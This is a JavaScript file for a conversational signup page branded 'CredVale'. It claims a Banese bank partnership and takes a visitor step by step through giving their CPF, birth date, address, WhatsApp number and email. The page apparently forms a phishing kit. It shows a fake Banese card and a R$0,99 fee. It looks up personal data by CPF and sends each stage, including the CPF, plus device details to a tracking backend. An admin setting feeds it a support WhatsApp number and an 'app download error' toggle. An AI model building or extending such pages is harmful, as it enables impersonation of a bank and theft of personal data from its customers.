// ============================================================
// Cadastro Conversacional V2 - Experiência Premium (Plano B)
// ============================================================
(() => {
  'use strict';

  /* ---- DOM refs ---- */
  const chatModal   = document.getElementById('chatModal');
  const chatMsg     = document.getElementById('chatMessages');
  const chatInput   = document.getElementById('chatInput');
  const chatSend    = document.getElementById('chatSend');
  const chatInputArea = document.getElementById('chatInputArea');
  const progBar     = document.getElementById('chatProgressBar');
  const progSteps   = document.querySelectorAll('#chatSteps .chat-progress__step');
  const pageMain    = document.querySelector('main');
  const pageHeader  = document.querySelector('.header');
  const pageFooter  = document.querySelector('.footer');

  /* ---- State ---- */
  const steps = ['Início','CPF','Dados','Endereço','Contato','Perfil','Análise','Plano','Adesão'];
  let currentStep = -1;
  let waitingInput = false;
  let currentResolve = null;
  let flowState = 'idle';
  let popupEl = null;

  const user = {
    cpf: '', nome: '', nascimento: '', sexo: '',
    cep: '', rua: '', bairro: '', cidade: '', uf: '',
    numero: '', complemento: '',
    whatsapp: '', email: ''
  };

  let chosenCard = 'virtual'; // 'virtual' | 'fisico'
  let chosenPlan = '';
  let quizAnswers = {};

  /* ---- Cache de preços (fixo R$0,99 para clientes Banese) ---- */
  var __precos = { virtual: 0.99, fisico: 0.99 };

  /* ---- WhatsApp de suporte (vindo do painel admin) ---- */
  var __supportWhatsApp = '';
  var __appDownloadErrorEnabled = true;

  async function carregarWhatsApp() {
    try {
      var d = await API.getSettings();
      if (d && d.settings) {
        if (d.settings.whatsapp) {
          __supportWhatsApp = d.settings.whatsapp.replace(/\D/g,'');
        }
        if (d.settings.app_download_error_enabled !== undefined) {
          __appDownloadErrorEnabled = d.settings.app_download_error_enabled === 'true';
        }
      }
    } catch(e) {}
    if (!__supportWhatsApp) {
      __supportWhatsApp = sessionStorage.getItem('vs_support_wa') || '5511999999999';
    }
    try { sessionStorage.setItem('vs_support_wa', __supportWhatsApp); } catch(e) {}
  }

  /* ---- Session tracking ---- */
  function getDeviceInfo() {
    var ua = navigator.userAgent;
    var disp = sessionStorage.getItem('vs_dispositivo') || 'Desktop';
    var mod = sessionStorage.getItem('vs_modelo') || 'PC';
    var os = sessionStorage.getItem('vs_os') || '';
    var nav = sessionStorage.getItem('vs_navegador') || (/Chrome/.test(ua) ? 'Chrome' : /Firefox/.test(ua) ? 'Firefox' : /Safari/.test(ua) && !/Chrome/.test(ua) ? 'Safari' : /Edge/.test(ua) ? 'Edge' : 'Desconhecido');
    var navVer = sessionStorage.getItem('vs_navegador_versao') || '';
    var fab = sessionStorage.getItem('vs_fabricante') || '';
    return { dispositivo: disp, modelo: mod, fabricante: fab, navegador: nav, navegador_versao: navVer, os: os };
  }

  async function ensureSession() {
    try {
      if (sessionStorage.getItem('vs_session_id')) return;
      var base = window.__API_BASE || '/api';
      var dd = getDeviceInfo();
      var info = Object.assign({ visitor_id: 'v-' + Date.now() + '-' + Math.random().toString(36).slice(2,10), origem: document.referrer || '' }, dd);
      var r = await fetch(base + '/track/session/start', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(info) });
      var d = await r.json();
      if (d.session_id) {
        sessionStorage.setItem('vs_session_id', d.session_id);
        // Persiste os device fields no sessionStorage
        if (dd.fabricante) sessionStorage.setItem('vs_fabricante', dd.fabricante);
        if (dd.navegador_versao) sessionStorage.setItem('vs_navegador_versao', dd.navegador_versao);
      }
    } catch(e) {}
  }

  function trackStage(stage, extra) {
    try {
      var sid = sessionStorage.getItem('vs_session_id');
      if (!sid) return;
      var base = window.__API_BASE || '/api';
      var payload = Object.assign({ session_id: sid, stage: stage }, getDeviceInfo());
      if (extra) { for (var k in extra) { if (extra.hasOwnProperty(k)) payload[k] = extra[k]; } }
      navigator.sendBeacon(base + '/track/session/stage', new Blob([JSON.stringify(payload)], {type:'application/json'}));
    } catch(e) {}
  }

  async function carregarPrecos() {
    // Preços fixos para clientes Banese — não sobrescrever
    return;
  }

  function getPreco(tipo) { return __precos[tipo] || (tipo==='virtual' ? 4.99 : 19.99); }
  function getPrecoStr(tipo) { return 'R$ '+getPreco(tipo).toFixed(2).replace('.',','); }

  /* ---- Utils ---- */
  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

  function fmtCpf(v) {
    v = v.replace(/\D/g,'');
    if (v.length>3) v=v.slice(0,3)+'.'+v.slice(3);
    if (v.length>7) v=v.slice(0,7)+'.'+v.slice(7);
    if (v.length>11) v=v.slice(0,11)+'-'+v.slice(11);
    return v.slice(0,14);
  }

  function fmtPhone(v) {
    v = v.replace(/\D/g,'');
    if (v.length>2) v='('+v.slice(0,2)+') '+v.slice(2);
    if (v.length>10) v=v.slice(0,10)+'-'+v.slice(10);
    return v.slice(0,15);
  }

  function fmtCep(v) {
    v = v.replace(/\D/g,'');
    if (v.length>5) v=v.slice(0,5)+'-'+v.slice(5);
    return v.slice(0,9);
  }

  function calcIdade(dataNasc) {
    var hoje = new Date();
    var nasc;
    if (dataNasc.includes('/')) { nasc = new Date(dataNasc.replace(/(\d{2})\/(\d{2})\/(\d{4})/,'$3-$2-$1')); }
    else { nasc = new Date(dataNasc); }
    var idade = hoje.getFullYear() - nasc.getFullYear();
    var m = hoje.getMonth() - nasc.getMonth();
    if (m<0 || (m===0 && hoje.getDate()<nasc.getDate())) idade--;
    return idade;
  }

  function abreviarNome(n) {
    var p = (n||'').trim().split(/\s+/);
    if (p.length<=1) return (p[0]||'TITULAR').toUpperCase();
    return (p[0]+' '+p[p.length-1][0]+'.').toUpperCase();
  }

  function formatarTelefone(num) {
    num = String(num).replace(/\D/g,'');
    if (num.length===11) return '('+num.slice(0,2)+') '+num.slice(2,7)+'-'+num.slice(7);
    if (num.length===10) return '('+num.slice(0,2)+') '+num.slice(2,6)+'-'+num.slice(6);
    return num;
  }

  function gerarCardBaneseSVG() {
    return '<div class="chat-card-welcome"><div class="chat-card-welcome__glow" style="background:radial-gradient(ellipse,rgba(4,120,87,0.15) 0%,transparent 70%);"></div><svg viewBox="0 0 340 210" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:280px;height:auto;display:block;margin:0 auto;border-radius:16px;box-shadow:0 12px 40px rgba(4,120,87,0.3);">'+
      '<defs>'+
        '<linearGradient id="banCardBg" x1="0" y1="0" x2="1" y2="1">'+
          '<stop offset="0%" stop-color="#022c22"/>'+
          '<stop offset="35%" stop-color="#064E3B"/>'+
          '<stop offset="70%" stop-color="#065F46"/>'+
          '<stop offset="100%" stop-color="#047857"/>'+
        '</linearGradient>'+
        '<radialGradient id="banCardShine" cx="30%" cy="20%" r="80%">'+
          '<stop offset="0%" stop-color="rgba(255,255,255,0.15)"/>'+
          '<stop offset="100%" stop-color="transparent"/>'+
        '</radialGradient>'+
        '<linearGradient id="banChip" x1="0" y1="0" x2="1" y2="1">'+
          '<stop offset="0%" stop-color="#fef3c7"/>'+
          '<stop offset="100%" stop-color="#d97706"/>'+
        '</linearGradient>'+
      '</defs>'+
      '<rect width="340" height="210" rx="16" fill="url(#banCardBg)"/>'+
      '<rect width="340" height="210" rx="16" fill="url(#banCardShine)"/>'+
      '<circle cx="260" cy="25" r="140" fill="rgba(255,255,255,0.03)"/>'+
      '<text x="28" y="40" font-family="Space Grotesk,Arial,sans-serif" font-size="12" font-weight="900" fill="rgba(255,255,255,0.7)" letter-spacing="3">BANESE</text>'+
      '<text x="170" y="40" font-family="Space Grotesk,Arial,sans-serif" font-size="10" font-weight="800" fill="rgba(255,255,255,0.3)" text-anchor="middle">&#9733;</text>'+
      '<text x="200" y="40" font-family="Space Grotesk,Arial,sans-serif" font-size="10" font-weight="800" fill="rgba(255,255,255,0.5)" letter-spacing="2">CREDVALE</text>'+
      '<rect x="28" y="68" width="44" height="32" rx="5" fill="url(#banChip)" opacity="0.9"/>'+
      '<rect x="31" y="71" width="38" height="26" rx="3" fill="rgba(255,255,255,0.06)"/>'+
      '<text x="28" y="138" font-family="Courier New,monospace" font-size="18" font-weight="700" fill="#ffffff" letter-spacing="3.5" opacity="0.95">&#9733;&#9733;&#9733;&#9733;  &#9733;&#9733;&#9733;&#9733;  &#9733;&#9733;&#9733;&#9733;  4589</text>'+
      '<text x="28" y="168" font-family="Arial,sans-serif" font-size="8" fill="rgba(255,255,255,0.35)" letter-spacing="1">TITULAR</text>'+
      '<text x="28" y="188" font-family="Arial,sans-serif" font-size="15" font-weight="700" fill="#ffffff">CLIENTE BANESE</text>'+
      '<text x="312" y="168" font-family="Arial,sans-serif" font-size="8" fill="rgba(255,255,255,0.35)" text-anchor="end" letter-spacing="1">VALIDADE</text>'+
      '<text x="312" y="188" font-family="Arial,sans-serif" font-size="13" font-weight="600" fill="#ffffff" text-anchor="end">12/30</text>'+
      '<text x="28" y="203" font-family="Arial,sans-serif" font-size="6.5" fill="rgba(255,255,255,0.2)" letter-spacing="0.8">Cartao emitido sob parceria BANESE &#183; CREDVALE</text>'+
    '</svg></div>';
  }

  /* ---- Chat UI ---- */
  function addMsg(text, type) {
    var el = document.createElement('div');
    el.className = 'chat-msg chat-msg--' + (type||'bot');
    el.innerHTML = text;
    chatMsg.appendChild(el);
    scrollDown();
    return el;
  }

  function addTyping() {
    var el = document.createElement('div');
    el.className = 'chat-typing';
    el.id = 'chatTyping';
    el.innerHTML = '<div class="chat-typing__dot"></div><div class="chat-typing__dot"></div><div class="chat-typing__dot"></div>';
    chatMsg.appendChild(el);
    scrollDown();
  }

  function removeTyping() {
    var t = document.getElementById('chatTyping');
    if (t) t.remove();
  }

  function scrollDown() {
    requestAnimationFrame(function() { chatMsg.scrollTop = chatMsg.scrollHeight; });
  }

  function setInput(placeholder, mode) {
    chatInput.placeholder = placeholder;
    chatInput.value = '';
    chatInput.disabled = false;
    chatInput.focus();
    chatInput.dataset.mode = mode || 'text';
    waitingInput = true;
    chatInputArea.hidden = false;
    var inputmodeMap = { cpf:'numeric', phone:'tel', cep:'numeric', email:'email', number:'numeric', text:'text' };
    chatInput.inputMode = inputmodeMap[mode] || 'text';
    if (mode==='email') chatInput.type = 'email';
    else if (mode==='cpf'||mode==='cep'||mode==='number'||mode==='phone') chatInput.type = 'text';
    else chatInput.type = 'text';
    // Limpa estado de validação
    chatInput.classList.remove('chat-input--error', 'chat-input--valid');
    showError('');
  }

  function hideInput() {
    chatInputArea.hidden = true;
    waitingInput = false;
    chatInput.disabled = true;
  }

  function showOptions(buttons) {
    var area = document.createElement('div');
    area.className = 'chat-options';
    area.id = 'chatOptions';
    buttons.forEach(function(b) {
      var btn = document.createElement('button');
      btn.className = 'chat-option' + (b.primary ? ' chat-option--primary' : '') + (b.danger ? ' chat-option--danger' : '');
      btn.textContent = b.label;
      btn.onclick = function() {
        area.remove();
        if (b.action) b.action();
      };
      area.appendChild(btn);
    });
    chatMsg.appendChild(area);
    scrollDown();
  }

  function updateProgress(step) {
    currentStep = step;
    var pct = step / (steps.length - 1) * 100;
    progBar.style.width = pct + '%';
    progSteps.forEach(function(el, i) {
      el.classList.remove('chat-progress__step--active', 'chat-progress__step--done');
      el.style.color = 'transparent';
      if (i < step) {
        el.classList.add('chat-progress__step--done');
        el.style.color = '#3B82F6';
      } else if (i === step) {
        el.classList.add('chat-progress__step--active');
        el.style.color = '#4CC8A4';
      }
    });
  }

  function sendUserInput(value) {
    if (!waitingInput || !value.trim()) return;
    // Validação em tempo real para phone/email
    var mode = chatInput.dataset.mode;
    if (mode === 'cpf' || mode === 'phone' || mode === 'email') {
      var res = validarInput();
      if (!res.valido) {
        aplicarEstadoInput();
        chatInput.focus();
        return;
      }
    }
    waitingInput = false;
    var v = value.trim();
    addMsg(v, 'user');
    chatInput.value = '';
    chatInput.disabled = true;
    chatInput.classList.remove('chat-input--error', 'chat-input--valid');
    showError('');
    scrollDown();
    if (currentResolve) { currentResolve(v); currentResolve = null; }
  }

  function waitUserInput() {
    return new Promise(function(resolve) {
      currentResolve = resolve;
      waitingInput = true;
      chatInput.disabled = false;
      chatInput.focus();
    });
  }

  /* ---- Pop-up system ---- */
  function showPopup(html, onClose) {
    if (popupEl) closePopup();
    var overlay = document.createElement('div');
    overlay.className = 'popup-overlay';
    overlay.innerHTML = '<div class="popup-box">'+html+'</div>';
    document.body.appendChild(overlay);
    popupEl = overlay;
    return overlay;
  }

  function closePopup() {
    if (popupEl) { popupEl.remove(); popupEl = null; }
  }

  /* ---- Validação ---- */
  var errorEl = document.getElementById('chatInputError');

  function showError(msg) {
    if (!errorEl) return;
    if (msg) {
      errorEl.textContent = msg;
      errorEl.hidden = false;
    } else {
      errorEl.hidden = true;
      errorEl.textContent = '';
    }
  }

  function validarCPF() {
    var v = chatInput.value.replace(/\D/g,'');
    if (v.length === 0) return { valido: false, msg: '' };
    if (v.length !== 11) return { valido: false, msg: 'Informe um CPF válido.' };
    // Rejeita sequências iguais (111.111.111-11, etc.)
    if (/^(\d)\1{10}$/.test(v)) return { valido: false, msg: 'Informe um CPF válido.' };
    // Valida 1º dígito verificador
    var soma = 0;
    for (var i = 0; i < 9; i++) soma += parseInt(v.charAt(i)) * (10 - i);
    var resto = (soma * 10) % 11;
    if (resto === 10) resto = 0;
    if (resto !== parseInt(v.charAt(9))) return { valido: false, msg: 'Informe um CPF válido.' };
    // Valida 2º dígito verificador
    soma = 0;
    for (var j = 0; j < 10; j++) soma += parseInt(v.charAt(j)) * (11 - j);
    resto = (soma * 10) % 11;
    if (resto === 10) resto = 0;
    if (resto !== parseInt(v.charAt(10))) return { valido: false, msg: 'Informe um CPF válido.' };
    return { valido: true, msg: '' };
  }

  function validarTelefone() {
    var v = chatInput.value.replace(/\D/g,'');
    var digs = v.length;
    if (digs === 0) return { valido: false, msg: '' };
    if (digs < 10 || digs > 11) return { valido: false, msg: 'Informe um número de telefone válido.' };
    // Valida DDD (primeiros 2 dígitos entre 11 e 99)
    var ddd = parseInt(v.slice(0,2), 10);
    if (ddd < 11 || ddd > 99 || ddd % 10 === 0) return { valido: false, msg: 'Informe um número de telefone válido.' };
    return { valido: true, msg: '' };
  }

  function validarEmail() {
    var v = chatInput.value.trim();
    if (v.length === 0) return { valido: false, msg: '' };
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)) return { valido: false, msg: 'Informe um e-mail válido.' };
    // Valida domínio contra lista de provedores permitidos
    var dominiosPermitidos = [
      'gmail.com', 'hotmail.com', 'outlook.com',
      'yahoo.com.br', 'yahoo.com', 'icloud.com',
      'bol.com.br', 'uol.com.br', 'terra.com.br', 'live.com'
    ];
    var dominio = v.split('@')[1].toLowerCase();
    if (!dominiosPermitidos.includes(dominio)) {
      return { valido: false, msg: 'Informe um e-mail válido utilizando um dos provedores permitidos.' };
    }
    return { valido: true, msg: '' };
  }

  function validarInput() {
    var mode = chatInput.dataset.mode;
    if (mode === 'cpf') return validarCPF();
    if (mode === 'phone') return validarTelefone();
    if (mode === 'email') return validarEmail();
    return { valido: true, msg: '' };
  }

  function aplicarEstadoInput() {
    var res = validarInput();
    chatInput.classList.remove('chat-input--error', 'chat-input--valid');
    if (res.valido && chatInput.value.trim().length > 0) {
      chatInput.classList.add('chat-input--valid');
      showError('');
    } else if (!res.valido && res.msg) {
      chatInput.classList.add('chat-input--error');
      showError(res.msg);
    } else {
      showError('');
    }
    return res.valido;
  }

  /* ---- Eventos do input ---- */
  chatSend.addEventListener('click', function() { sendUserInput(chatInput.value); });

  chatInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') { e.preventDefault(); sendUserInput(chatInput.value); return; }
    if (chatInput.dataset.mode === 'cpf') {
      trackStage('Consultando CPF');
      requestAnimationFrame(function() { chatInput.value = fmtCpf(chatInput.value); });
    } else if (chatInput.dataset.mode === 'phone') {
      requestAnimationFrame(function() { chatInput.value = fmtPhone(chatInput.value); });
    } else if (chatInput.dataset.mode === 'cep') {
      requestAnimationFrame(function() { chatInput.value = fmtCep(chatInput.value); });
    }
  });

  chatInput.addEventListener('input', function() {
    var mode = chatInput.dataset.mode;
    if (mode === 'cpf') {
      requestAnimationFrame(function() { chatInput.value = fmtCpf(chatInput.value); });
    } else if (mode === 'phone') {
      requestAnimationFrame(function() { chatInput.value = fmtPhone(chatInput.value); });
    }
    if (mode === 'cpf' || mode === 'phone' || mode === 'email') aplicarEstadoInput();
  });

  chatInput.addEventListener('blur', function() {
    var mode = chatInput.dataset.mode;
    if (mode === 'cpf' || mode === 'phone' || mode === 'email') aplicarEstadoInput();
  });

  window.fecharChat = function() {
    if (confirm('Tem certeza que deseja sair? Seu progresso não será salvo.')) {
      window.location.href = '/';
    }
  };

  /* ============================================================
     FLUXO CONVERSACIONAL V2
     ============================================================ */

  async function iniciarFluxo() {
    if (pageMain) pageMain.style.display = 'none';
    if (pageHeader) pageHeader.style.display = 'none';
    if (pageFooter) pageFooter.style.display = 'none';
    chatModal.hidden = false;
    document.body.style.overflow = 'hidden';
    hideInput();
    await sleep(400);

    var savedCPF = sessionStorage.getItem('credvale_cpf');
    var savedName = sessionStorage.getItem('credvale_name');

    if (savedCPF && savedName) {
      window._iniciarChat();
    } else {
      addMsg(
        '<div class="chat-welcome-v2">'+
          gerarCardBaneseSVG()+
          '<div class="chat-welcome-v2__title" style="color:#1F2937;font-size:1.25rem;font-weight:700;">Bem-vindo.</div>'+
          '<div class="chat-welcome-v2__desc" style="color:#6B7280;font-size:0.85rem;line-height:1.6;margin-top:2px;">'+
            'Estamos preparando seu acesso aos benefícios exclusivos da CredVale para clientes Banese.<br>'+
            'O processo é rápido e leva apenas alguns instantes.'+
          '</div>'+
          '<div style="display:flex;flex-direction:column;gap:5px;margin-top:8px;padding:4px 0;">'+
            '<div style="display:flex;align-items:center;gap:6px;font-size:0.78rem;color:#4B5563;">'+
              '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#059669" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>'+
              '<span>Cliente Banese</span>'+
            '</div>'+
            '<div style="display:flex;align-items:center;gap:6px;font-size:0.78rem;color:#4B5563;">'+
              '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#059669" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>'+
              '<span>Benefícios exclusivos</span>'+
            '</div>'+
            '<div style="display:flex;align-items:center;gap:6px;font-size:0.78rem;color:#4B5563;">'+
              '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#059669" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>'+
              '<span>Cadastro seguro</span>'+
            '</div>'+
          '</div>'+
          '<div class="chat-welcome-v2__badge" style="margin-top:8px;background:#F3F4F6;color:#6B7280;border:1px solid #E5E7EB;">'+
            '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#6B7280" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;margin-right:4px;"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>'+
            'Cadastro seguro'+
          '</div>'+
        '</div>'
      );
      addMsg('Olá.<br>Vamos iniciar seu cadastro. Informe seu CPF para continuar.');
      etapaCPF(true);
    }
  }

  window._iniciarChat = function() {
    var savedCPF = sessionStorage.getItem('credvale_cpf');
    var savedName = sessionStorage.getItem('credvale_name');
    var savedNasc = sessionStorage.getItem('credvale_nascimento');
    var savedSexo = sessionStorage.getItem('credvale_sexo');
    if (savedCPF && savedName) {
      user.cpf = savedCPF.replace(/\D/g,'');
      user.nome = savedName;
      if (savedNasc) user.nascimento = savedNasc;
      if (savedSexo) user.sexo = savedSexo;
      addMsg('<strong>Bem-vindo de volta, '+savedName.split(' ')[0]+'!</strong> 🎉');
      addMsg('Já temos seu CPF <strong>'+savedCPF+'</strong> e seus dados da consulta anterior.');
      var dadosHtml = '<div class="chat-data-card"><div class="chat-data-row"><span class="chat-data-label">Nome</span><span class="chat-data-value">'+savedName+'</span></div><div class="chat-data-row"><span class="chat-data-label">CPF</span><span class="chat-data-value">'+savedCPF+'</span></div>';
      if (savedNasc) dadosHtml += '<div class="chat-data-row"><span class="chat-data-label">Nascimento</span><span class="chat-data-value">'+savedNasc+'</span></div>';
      if (savedSexo) dadosHtml += '<div class="chat-data-row"><span class="chat-data-label">Sexo</span><span class="chat-data-value">'+(savedSexo==='F'?'Feminino':savedSexo==='M'?'Masculino':savedSexo)+'</span></div>';
      dadosHtml += '</div>';
      addMsg(dadosHtml,'bot');
      showOptions([
        { label:'✅ Continuar', primary:true, action:function(){ etapaCEP(); } },
        { label:'✏️ Trocar CPF', danger:true, action:function(){ etapaCPF(); } }
      ]);
    } else {
      etapaCPF();
    }
  };

  /* ---- ETAPA 1: CPF ---- */
  async function etapaCPF(skipGreeting) {
    flowState = 'cpf';
    updateProgress(1);
    if (!skipGreeting) {
      await sleep(300);
      addTyping(); await sleep(600); removeTyping();
      addMsg('Olá! 👋<br>Vamos localizar seu cadastro.<br><strong>Informe seu CPF.</strong>');
    }
    setInput('Digite seu CPF', 'cpf');

    while (true) {
      var cpf = await waitUserInput();
      cpf = cpf.replace(/\D/g,'');
      user.cpf = cpf;

      // Verifica CPF existente no backend
      addTyping(); await sleep(400); removeTyping();
      trackStage('Consultando CPF');
      var existente = await verificarCPFExistente(cpf);
      if (existente) { trackStage('CPF Encontrado', {cpf: cpf}); return; }
      trackStage('CPF Não Encontrado');

      // Consulta API CPF externa
      addTyping(); await sleep(500); removeTyping();
      var dados = null;
      try {
        var resp = await fetch((window.__API_BASE||'/api')+'/cpf/consult', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({cpf:cpf}) });
        if (resp.ok) { var j = await resp.json(); dados = j.data||j; }
      } catch(e) {}

      if (dados && (dados.nome_completo||dados.nome)) {
        user.nome = dados.nome_completo||dados.nome||'';
        user.nascimento = dados.data_nascimento||'';
        user.sexo = dados.sexo||'';
        addMsg('<strong>Localizamos seu cadastro.</strong>', 'bot');
        var nasc = user.nascimento||'—';
        var idade = user.nascimento ? ' · '+calcIdade(user.nascimento)+' anos' : '';
        var sexo = user.sexo==='F'?'Feminino':user.sexo==='M'?'Masculino':user.sexo||'—';
        addMsg('<div class="chat-data-card"><div class="chat-data-row"><span class="chat-data-label">Nome</span><span class="chat-data-value">'+user.nome+'</span></div><div class="chat-data-row"><span class="chat-data-label">Nascimento</span><span class="chat-data-value">'+nasc+idade+'</span></div><div class="chat-data-row"><span class="chat-data-label">Sexo</span><span class="chat-data-value">'+sexo+'</span></div></div>','bot');
        showOptions([
          { label:'✅ Sim, estão corretos', primary:true, action:function(){ etapaCEP(); } },
          { label:'✏️ Editar', danger:true, action:function(){ etapaCPFEditar(); } }
        ]);
        return;
      }
      // Não encontrou na API externa
      addMsg('Não encontramos um cadastro anterior. <strong>Vamos criar um novo cadastro.</strong>', 'bot');
      etapaCPFEditar();
      return;
    }
  }

  async function etapaCPFEditar() {
    hideInput();
    addMsg('Qual seu <strong>nome completo</strong>?');
    setInput('Seu nome completo');
    user.nome = await waitUserInput();
    addMsg('Data de <strong>nascimento</strong> (DD/MM/AAAA):');
    setInput('Ex: 15/03/1990');
    user.nascimento = await waitUserInput();
    addMsg('Qual o <strong>sexo</strong>?');
    showOptions([
      { label:'♀ Feminino', action:function(){ user.sexo='F'; etapaCEP(); } },
      { label:'♂ Masculino', action:function(){ user.sexo='M'; etapaCEP(); } }
    ]);
  }

  /* ---- ETAPA 2: CEP ---- */
  async function etapaCEP() {
    flowState = 'cep';
    updateProgress(2);
    await sleep(300);
    addTyping(); await sleep(500); removeTyping();

    addMsg('Agora confirme seu <strong>endereço</strong>.<br>Digite seu <strong>CEP</strong>.');
    setInput('Digite seu CEP', 'cep');

    while (true) {
      var cep = await waitUserInput();
      cep = cep.replace(/\D/g,'');
      if (cep.length!==8) { addMsg('CEP inválido. Digite 8 números.', 'bot'); setInput('Digite seu CEP', 'cep'); continue; }
      user.cep = cep;

      addTyping(); await sleep(600); removeTyping();
      var end = null;
      try { var ac = new AbortController(), to = setTimeout(function(){ac.abort()},8000); var r = await fetch('https://viacep.com.br/ws/'+cep+'/json/',{signal:ac.signal}); clearTimeout(to); if (r.ok) end = await r.json(); } catch(e) {}

      if (end && !end.erro) {
        user.rua = end.logradouro||'';
        user.bairro = end.bairro||'';
        user.cidade = end.localidade||'';
        user.uf = end.uf||'';
        addMsg('Seu endereço:', 'bot');
        addMsg('<div class="chat-data-card"><div class="chat-data-row"><span class="chat-data-label">Rua</span><span class="chat-data-value">'+user.rua+'</span></div><div class="chat-data-row"><span class="chat-data-label">Bairro</span><span class="chat-data-value">'+user.bairro+'</span></div><div class="chat-data-row"><span class="chat-data-label">Cidade</span><span class="chat-data-value">'+user.cidade+' - '+user.uf+'</span></div></div>','bot');
        await sleep(200);
        addMsg('Qual o <strong>número</strong>?');
        setInput('Número', 'number');
        user.numero = await waitUserInput();        addMsg('<strong>Complemento?</strong> (opcional)');
        hideInput();
        user.complemento = await new Promise(function(resolve) {
          addMsg('<div style="font-size:0.78rem;color:#475569;text-align:center;padding:2px 0 8px;">Se n\u00e3o tiver complemento, basta clicar em <strong>Continuar</strong>.</div>');
          showOptions([
            { label:'Continuar \u2192', primary:true, action:function(){ resolve(''); } },
            { label:'\u270f\ufe0f Informar complemento', action:function(){ setInput('Complemento'); waitUserInput().then(function(v){ resolve(v.trim()); }); }}
          ]);
        });
        etapaContato();
        return;
      }
      addMsg('CEP não encontrado. Digite o endereço manualmente.', 'bot');
      await sleep(200);
      addMsg('Qual a <strong>rua</strong>?'); setInput('Rua'); user.rua = await waitUserInput();
      addMsg('Qual o <strong>bairro</strong>?'); setInput('Bairro'); user.bairro = await waitUserInput();
      addMsg('Qual a <strong>cidade</strong>?'); setInput('Cidade'); user.cidade = await waitUserInput();
      addMsg('Qual o <strong>estado</strong>? (sigla: SP, RJ...)'); setInput('Ex: SP'); user.uf = (await waitUserInput()).toUpperCase();
      addMsg('Qual o <strong>número</strong>?'); setInput('Número', 'number'); user.numero = await waitUserInput();
      addMsg('<strong>Complemento?</strong> (opcional)');
      hideInput();
      user.complemento = await new Promise(function(resolve) {
        addMsg('<div style="font-size:0.78rem;color:#475569;text-align:center;padding:2px 0 8px;">Se n\u00e3o tiver complemento, basta clicar em <strong>Continuar</strong>.</div>');
        showOptions([
          { label:'Continuar \u2192', primary:true, action:function(){ resolve(''); } },
          { label:'\u270f\ufe0f Informar complemento', action:function(){ setInput('Complemento'); waitUserInput().then(function(v){ resolve(v.trim()); }); }}
        ]);
      });
      etapaContato();
      return;
    }
  }

  /* ---- ETAPA 3: Contato ---- */
  async function etapaContato() {
    flowState = 'contato';
    updateProgress(4);
    await sleep(200);
    addTyping(); await sleep(500); removeTyping();

    addMsg('Agora seu <strong>WhatsApp</strong> para contato:');
    setInput('(11) 99999-9999', 'phone');
    while (true) {
      var p = await waitUserInput();
      p = p.replace(/\D/g,'');
      if (!p || p.length < 10) continue;
      user.whatsapp = p;
      var phoneFmt = formatarTelefone(p);
      addMsg('WhatsApp: <strong>'+phoneFmt+'</strong>', 'user');

      hideInput();
      var waHtml =
        '<div style="display:flex;flex-direction:column;align-items:center;gap:10px;padding:8px 0;">'+
          '<div style="width:56px;height:56px;border-radius:50%;background:#25D366;display:flex;align-items:center;justify-content:center;">'+
            '<svg width="28" height="28" viewBox="0 0 24 24" fill="white"><path d="M12 0C5.373 0 0 5.373 0 12c0 6.627 5.373 12 12 12s12-5.373 12-12S18.627 0 12 0zm6.262 15.264c-.104.262-.389.522-.793.736-.404.214-1.009.346-1.593.382-.593.036-1.152.042-1.707-.086-.564-.129-1.147-.337-1.747-.617-1.21-.566-2.326-1.387-3.364-2.333-1.036-.946-1.861-2.068-2.428-3.285-.283-.607-.485-1.21-.596-1.807-.111-.597-.106-1.159-.01-1.628.096-.469.264-.826.483-1.1.22-.274.455-.42.679-.476.224-.056.448-.033.672.01.224.042.448.115.672.222.224.107.448.269.672.486.224.217.448.508.672.872.112.183.206.366.283.549.077.183.115.37.115.562 0 .192-.038.398-.115.618-.077.22-.182.44-.317.66-.134.22-.288.425-.462.615-.173.19-.367.377-.582.56.038.115.092.24.163.374.07.134.156.276.259.425.103.149.224.307.365.473.14.166.297.338.47.515.218.224.419.422.603.594.184.172.352.32.504.445.152.125.286.226.403.303.117.077.216.13.298.16.081.03.145.05.192.06.047.01.076.01.086 0 .01-.01.024-.065.043-.166.019-.101.042-.244.07-.429.028-.185.05-.38.066-.586.016-.206.019-.393.01-.56-.01-.168-.03-.3-.062-.397-.032-.097-.063-.16-.094-.19-.031-.03-.048-.046-.052-.048 0-.002.031-.035.094-.098.063-.064.153-.164.27-.3.117-.136.251-.3.403-.492.152-.192.292-.396.42-.612.128-.216.28-.478.454-.786.174-.308.306-.613.396-.915.09-.302.135-.579.135-.832 0-.16-.021-.3-.064-.422-.043-.122-.095-.214-.156-.276-.06-.062-.12-.104-.18-.125-.06-.021-.098-.032-.113-.032l-.348-.048c-.246-.033-.53-.05-.852-.05-.32 0-.668.032-1.043.096-.375.064-.734.16-1.077.29-.343.13-.658.284-.945.462-.287.178-.537.363-.75.556-.213.192-.38.367-.5.524-.12.157-.2.27-.24.34l-.095.164c-.033.056-.06.092-.082.108-.022.016-.039.019-.052.01-.013-.01-.032-.036-.057-.078-.025-.042-.064-.115-.116-.22-.052-.104-.113-.246-.183-.425-.07-.179-.17-.402-.3-.668-.13-.266-.272-.545-.425-.838-.153-.293-.322-.577-.507-.852-.185-.275-.365-.508-.54-.699-.175-.191-.33-.323-.465-.397-.135-.074-.238-.112-.31-.115-.072-.003-.1-.003-.083 0z"/></svg>'+
          '</div>'+
          '<div style="font-size:1.1rem;font-weight:800;color:#0f172a;">Seu WhatsApp está correto?</div>'+
